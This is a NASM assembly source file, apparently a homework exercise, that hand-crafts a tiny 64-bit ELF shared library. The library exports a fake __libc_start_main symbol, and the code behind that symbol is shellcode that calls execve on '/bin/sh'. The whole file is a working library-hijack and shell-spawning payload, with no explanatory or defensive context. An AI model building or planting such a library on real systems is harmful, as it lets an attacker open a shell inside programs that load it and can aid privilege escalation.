; HW_4.asm
BITS 64
ehdr:                                          ; ELF64_Ehdr
        db  0x7F, "ELF", 2, 1, 1, 0            ; e_indent
times 8 db  0                                  ; EI_PAD
        dw  3                                  ; e_type
        dw  0x3e                               ; e_machine
        dd  1                                  ; e_version
        dq  __libc_start_main                  ; e_entry
        dq  phdr1 - $$                         ; e_phoff
        dq  0                         ; e_shoff
        dd  0                                  ; e_flags
        dw  ehdrsize                           ; e_ehsize
        dw  phdrsize                           ; e_phentsize
        dw  2                                  ; e_phnum
        dw  64                                 ; e_shentsize
        dw  0                                  ; e_shnum
        dw  0                                  ; e_shstrndx

ehdrsize    equ $ - ehdr


phdr1:
        dd  1                                  ; p_type
        dd  7                                  ; p_flags
        dq  $$                                 ; p_offset
        dq  $$                                 ; p_vaddr
        dq  $$                                 ; p_paddr
        dq  filesize                           ; p_filesz
        dq  filesize                           ; p_memsz
        dq  0                                  ; p_align

phdrsize    equ $ - phdr1

phdr2:
        dd  2                                  ; p_type
        dd  6                                  ; p_flags
        dq  dynamic - $$                       ; p_offset
        dq  dynamic - $$                       ; p_vaddr
        dq  dynamic - $$                       ; p_paddr
        dq  dynamicsize                        ; p_filesz
        dq  dynamicsize                        ; p_memsz
        dq  0                                  ; p_align

hash:

        dd  1
        dd  2
        dd  1
dynsym:
        dd  0, 0
hashsize equ $ - hash

    dq 0
    ; size
    dq 0

; symbol: __libc_start_main
    ; name
    dd lsm - sb
    ; type
    db 18
    ; visibility
    db 0
    ; shndx
    dw 1
    ; value
    dq __libc_start_main - $$
    ; size
    dq 0

dynsymsize equ $ - dynsym

dynstr:
sb  db 0
lsm db "__libc_start_main"
    db 0

dynstrsize equ $ - dynstr

text:

__libc_start_main:

        xor rdx, rdx
        mov rbx, 0x0068732f6e69622f
        push    rbx
        mov rdi, rsp
        xor rax,rax
        push    rax
        push    rdi
        mov rsi,rsp
        mov al, 0x3b    ; execve(3b)
        syscall

textsize equ $ - text

dynamic:

    dq 4
    dq hash

    dq 5
    dq dynstr

    dq 6
    dq dynsym

dynamicsize equ $ - dynamic
filesize equ $ - $$
